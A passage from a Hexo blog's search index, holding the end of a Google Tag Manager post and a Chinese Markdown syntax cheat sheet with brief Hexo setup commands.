href="https://www.ichdata.com/google-tag-manager-series.html" target="_blank" rel="noopener">GA小站</a></li><li><a href="https://marketingplatform.google.com/about/tag-manager/" target="_blank" rel="noopener">Google tag manager官网</a></li></ul>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Markdown</title>
      <link href="/2017/10/06/Markdown%E8%AF%AD%E6%B3%95/"/>
      <url>/2017/10/06/Markdown%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<h4 id="1-标题"><a href="#1-标题" class="headerlink" title="1. 标题"></a>1. 标题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">……</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure><h4 id="2-字体"><a href="#2-字体" class="headerlink" title="2. 字体"></a>2. 字体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**这是加粗的文字**</span><br><span class="line">*这是倾斜的文字*`</span><br><span class="line">***这是斜体加粗的文字***</span><br><span class="line">~~这是加删除线的文字~~</span><br></pre></td></tr></table></figure><h4 id="3-引用"><a href="#3-引用" class="headerlink" title="3. 引用"></a>3. 引用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;这是引用的内容</span><br><span class="line">&gt;&gt;这是引用的内容</span><br></pre></td></tr></table></figure><h4 id="4-分割线"><a href="#4-分割线" class="headerlink" title="4. 分割线"></a>4. 分割线</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">***</span><br><span class="line">*****</span><br></pre></td></tr></table></figure><h4 id="5-图片"><a href="#5-图片" class="headerlink" title="5. 图片"></a>5. 图片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![图片alt](图片地址 “图片title”)</span><br></pre></td></tr></table></figure><p>安装<code>npm install hexo-asset-image --save</code>, 新加文章<code>hexo new</code></p><h4 id="6-超链接"><a href="#6-超链接" class="headerlink" title="6. 超链接"></a>6. 超链接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[超链接名]（超链接地址）</span><br><span class="line">[简书](http://jianshu.com)</span><br></pre></td></tr></table></figure><h4 id="7-无序列表"><a href="#7-无序列表" class="headerlink" title="7. 无序列表"></a>7. 无序列表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 列表内容</span><br><span class="line">+ 列表内容</span><br><span class="line">* 列表内容</span><br></pre></td></tr></table></figure><p>列表嵌套: 上一级和下一级之间敲三个空格即可</p><h4 id="8-表格"><a href="#8-表格" class="headerlink" title="8. 表格"></a>8. 表格</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">表头|表头|表头</span><br><span class="line">---|:--:|---:</span><br><span class="line">内容|内容|内容</span><br><span class="line">内容|内容|内容</span><br></pre></td></tr></table></figure><h4 id="9-代码"><a href="#9-代码" class="headerlink" title="9. 代码"></a>9. 代码</h4>`单行代码`<br>```<br>  多行代码…<br>  多行代码…<br>  `` `]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
